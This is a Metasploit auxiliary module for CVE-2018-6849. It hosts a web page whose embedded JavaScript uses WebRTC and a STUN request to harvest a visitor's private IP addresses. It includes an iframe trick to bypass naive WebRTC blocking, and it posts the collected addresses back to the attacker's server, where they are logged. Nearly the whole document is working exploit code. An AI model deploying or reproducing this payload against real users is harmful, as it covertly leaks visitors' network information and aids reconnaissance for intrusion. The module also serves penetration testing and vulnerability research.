# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => "Private IP Leakage to WebPage using WebRTC Function.",
        &#039;Description&#039;    => %q(
          This module exploits a vulnerability in browsers using well-known property of WebRTC (Web Real-Time Communications) which enables Web applications and sites to capture or exchange arbitrary data between browsers without requiring an intermediary.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Brendan Coles&#039;, #MSF Module
          &#039;Dhiraj Mishra&#039;  #MSF Module
        ],
        &#039;References&#039;     => [
        [ &#039;CVE&#039;, &#039;2018-6849&#039; ],
        [&#039;URL&#039;, &#039;https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;Jan 26 2018&#039;,
        &#039;Actions&#039;        => [[ &#039;WebServer&#039; ]],
        &#039;PassiveActions&#039; => [ &#039;WebServer&#039; ],
        &#039;DefaultAction&#039;  => &#039;WebServer&#039;
      )
    )
  end
 
  def run
    exploit # start http server
  end
 
  def setup
     # code from: https://github.com/diafygi/webrtc-ips
     @html = <<-JS
<script>
//get the IP addresses associated with an account
function getIPs(callback){
    var ip_dups = {};
 
    //compatibility for firefox and chrome
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;
 
    //bypass naive webrtc blocking using an iframe
    if(!RTCPeerConnection){
        //NOTE: you need to have an iframe in the page right above the script tag
        //
        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        //<script>...getIPs called in here...
        //
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }
 
    //minimal requirements for data connection
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };
 
    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
 
    //construct a new RTCPeerConnection
    var pc = new RTCPeerConnection(servers, mediaConstraints);
 
    function handleCandidate(candidate){
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];
 
        //remove duplicates
        if(ip_dups[ip_addr] === undefined)
            callback(ip_addr);
 
        ip_dups[ip_addr] = true;
    }
 
    //listen for candidate events
    pc.onicecandidate = function(ice){
 
        //skip non-candidate events
        if(ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };
 
    //create a bogus data channel
    pc.createDataChannel("");
 
    //create an offer sdp
    pc.createOffer(function(result){
 
        //trigger the stun server request
        pc.setLocalDescription(result, function(){}, function(){});
 
    }, function(){});
 
    //wait for a while to let everything done
    setTimeout(function(){
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split(&#039;\\n&#039;);
 
        lines.forEach(function(line){
            if(line.indexOf(&#039;a=candidate:&#039;) === 0)
                handleCandidate(line);
        });
    }, 1000);
}
 
getIPs(function(ip){
  //console.log(ip);
  var xmlhttp = new XMLHttpRequest;
  xmlhttp.open(&#039;POST&#039;, window.location, true);
  xmlhttp.send(ip);
});
</script>
     JS
  end
 
  def on_request_uri(cli, request)
    case request.method.downcase
    when &#039;get&#039;
      print_status("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
      send_response(cli, @html)
    when &#039;post&#039;
      print_status("#{cli.peerhost}: Received reply:")
      puts request.to_s
    else
      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
    end
  end
end

